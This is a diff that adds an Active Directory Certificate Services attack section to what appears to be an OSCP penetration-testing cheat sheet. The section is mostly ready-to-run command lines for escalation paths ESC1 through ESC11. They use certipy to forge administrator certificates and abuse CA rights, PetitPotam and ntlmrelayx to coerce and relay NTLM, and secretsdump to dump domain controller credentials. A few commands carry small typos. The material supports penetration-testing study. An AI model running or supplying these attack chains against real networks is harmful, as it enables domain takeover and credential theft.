@@ -121,6 +121,7 @@ Thank you for reading.
 		- [MSL / Polyglot Attack](https://github.com/0xsyr0/OSCP#msl--polyglot-attack)
 		- [Metasploit](https://github.com/0xsyr0/OSCP#metasploit)
 	- [Post Exploitation](https://github.com/0xsyr0/OSCP#post-exploitation-1)
+ 		- [Active Directory Certificate Services (AD CS)](https://github.com/0xsyr0/OSCP#active-directory-certificate-services-ad-cs)
 		- [ADCSTemplate](https://github.com/0xsyr0/OSCP#adcstemplate)
 		- [BloodHound](https://github.com/0xsyr0/OSCP#bloodhound)
 		- [BloodHound Python](https://github.com/0xsyr0/OSCP#bloodhound-python)
@@ -2703,6 +2704,122 @@ meterpreter > download *
 
 ### Post Exploitation
 
+#### Active Directory Certificate Services (AD CS)
+
+```c
+certipy find -username <USERNAME>@<DOMAIN> -password <PASSWORD> -dc-ip <RHOST>
+```
+
+##### ESC1: Misconfigured Certificate Templates
+
+```c
+certipy req -username <USERNAME>@<DOMAIN> -password <PASSWORD> -ca <CA> -target <CA> -template <TEMPLATE> -upn administrator@<DOMAIN> -dns <RHOST>
+certipy auth -pfx administrator.pfx -dc-ip <RHOST>
+```
+
+##### ESC2: Misconfigured Certificate Templates
+
+```c
+certipy req -username <USERNAME>@<DOMAIN> -password <PASSWORD> -ca <CA> -target <CA> -template <TEMPLATE>
+certipy req -username <USERNAME>@<DOMAIN> -password <PASSWORD> -ca <CA> -target <CA> -template User -on-behalf-of '<DOMAIN>\Administrator' -pfx <USERNAME>.pfx
+certipy auth -pfx administrator.pfx -dc-ip <RHOST>
+```
+
+##### ESC3: Enrollment Agent Templates
+
+```c
+certipy req -username <USERNAME>@<DOMAIN> -password <PASSWORD> -ca <CA> -target <CA> -template <TEMPLATE>
+certipy req -username <USERNAME>@<DOMAIN> -password <PASSWORD> -ca <CA> -target <CA> -template User -on-behalf-of '<DOMAIN>\Administrator' -pfx <USERNAME>.pfx
+certipy auth -pfx administrator.pfx -dc-ip <RHOST>
+```
+
+##### ESC4: Vulnerable Certificate Template Access Control
+
+```c
+certipy template -username <USERNAME>@<DOMAIN> -password <PASSWORD> -template <TEMPLAET> -save-old
+certipy req -username <USERNAME>@<DOMAIN> -password <PASSWORD> -ca <CA> -target <CA> -template <TEMPLATE> -upn administrator@<DOMAIN>
+certipy auth -pfx administrator.pfx -dc-ip <RHOST>
+```
+
+##### ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2
+
+```c
+certipy find -username <USERNAME>@<DOMAIN> -password <PASSWORD> -vulnerable -dc-ip 192.168.56.12 -stdout
+certipy req -username <USERNAME>@<DOMAIN> -password <PASSWORD> -ca <CA> -target <CA> -template User -upn administrator@<DOMAIN>
+certipy req -username administrator@<DOMAIN> -password <PASSWORD> -ca <CA> -target <CA> -template User -upn administrator@<DOMAIN>
+certipy auth -pfx administrator.pfx -dc-ip <RHOST>
+```
+
+##### ESC7: Vulnerable Certificate Authority Access Control
+
+```c
+certipy ca -ca '<CA>' -add-officer <USERNAME> -username <USERNAME>@<DOMAIN> -password <PASSWORD>
+certipy ca -ca '<CA>' -enable-template <TEMPLATE> -username <USERNAME>@<DOMAIN> -password <PASSWORD>
+certipy req -username <USERNAME>@<DOMAIN> -password <PASSWORD> -ca <CA> -target <CA> -template <TEMPLATE> -upn administrator@<DOMAIN>
+certipy ca -ca '<CA>' -issue-request <ID> -username <USERNAME>@<DOMAIN> -password <PASSWORD>
+certipy req -username <USERNAME>@<DOMAIN> -password <PASSWORD> -ca <CA> -target <CA> -retrieve <iD>
+certipy auth -pfx administrator.pfx -dc-ip <RHOST>
+```
+
+##### ESC8: NTLM Relay to AD CS HTTP Endpoints
+
+```c
+certipy relay -target 'http://<CA>'
+certipy relay -ca <CA> -template <TEMPLATE>
+python3 PetitPotam.py <RHOST> <DOMAIN>
+certipy auth -pfx dc.pfx -dc-ip <RHOST>
+export KRB5CCNAME=dc.ccache
+sudo secretsdump.py -k -no-pass <DOMAIN>/'dc$'@<DOMAIN>
+```
+
+###### Coercing
+
+```c
+sudo ntlmrelayx.py -t http://<RHOST>/certsrv/certfnsh.asp -smb2support --adcs --template <TEMPLATE>
+python3 PetitPotam.py <RHOST> <DOMAIN>
+python3 gettgtpkinit.py -pfx-base64 $(cat base64.b64) '<DOMAIN>'/'dc$' 'dc.ccache'
+export KRB5CCNAME=dc.ccache
+sudo secretsdump.py -k -no-pass <DOMAIN>/'dc$'@<DOMAIN>
+```
+
+##### ESC9: No Security Extensions
+
+```c
+certipy shadow auto -username <USERNAME>@<DOMAIN> -password <PASSWORD> -account <USERNAME>
+certipy account update -username <USERNAME>@<DOMAIN> -password <PASSWORD> -user <USERNAME> -upn Administrator
+certipy req -username <USERNAME> -hashes 54296a48cd30259cc88095373cec24da -ca <CA> -template <TEMPLATE>
+certipy account update -username <USERNAME>@<DOMAIN> -password <PASSWORD> -user <USERNAME> -upn <USERNAME>@<DOMAIN>
+certipy auth -pfx administrator.pfx -domain <DOMAIN>
+```
+
+##### ESC10: Weak Certificate Mappings
+
+###### Case 1
+
+```c
+certipy shadow auto -username <USERNAME>@<DOMAIN> -password <PASSWORD> -account <USERNAME>
+certipy account update -username <USERNAME>@<DOMAIN> -password <PASSWORD> -user <USERNAME> -upn Administrator
+certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -hashes a87f3a337d73085c45f9416be5787d86
+certipy account update -username <USERNAME>@<DOMAIN> -password <PASSWORD> -user <USERNAME -upn <USERNAME>@<DOMAIN>
+certipy auth -pfx administrator.pfx -domain <DOMAIN>
+```
+
+###### Case 2
+
+```c
+certipy shadow auto -username <USERNAME>@<DOMAIN> -password <PASSWORD> -account <USERNAME>
+certipy account update -username <USERNAME>@<DOMAIN> -password <PASSWORD> -user <USERNAME> -upn 'DC$@<DOMAIN>'
+certipy req -ca 'CA' -username <USERNAME>@<DOMAIN> -password -hashes a87f3a337d73085c45f9416be5787d86
+certipy account update -username <USERNAME>@<DOMAIN> -password <PASSWORD> -user <USERNAME -upn <USERNAME>@<DOMAIN>
+certipy auth -pfx dc.pfx -dc-ip <RHOST> -ldap-shell
+```
+
+##### ESC11: IF_ENFORCEENCRYPTICERTREQUEST
+
+```c
+certipy relay -target 'rpc://<CA>' -ca 'CA'
+certipy auth -pfx administrator.pfx -domain <DOMAIN>
+```
 ### ADCSTemplate
 
 ```c
